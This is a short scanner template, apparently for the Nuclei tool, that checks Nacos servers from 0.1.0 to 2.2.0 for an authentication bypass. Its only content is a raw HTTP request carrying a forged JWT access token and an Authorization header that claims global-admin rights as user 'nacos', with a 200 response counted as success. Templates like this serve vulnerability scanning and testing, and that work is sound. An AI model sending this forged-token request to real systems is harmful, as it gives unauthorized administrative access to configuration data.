id: NACOS-unauthorized

info:
  name: 0.1.0 <= Nacos <= 2.2.0 unauthorized
  author: Jaky
  severity: high
  tags: Nacos,unauthorized

requests:
  - raw:
      - |+
        GET /nacos/v1/console/namespaces?&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU&namespaceId=  HTTP/1.1
        Host: {{Hostname}}
        Authorization:{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU","tokenTtl":18000,"globalAdmin":true,"username":"nacos"}
        

    unsafe: true
    matchers:
      - type: status
        status:
          - 200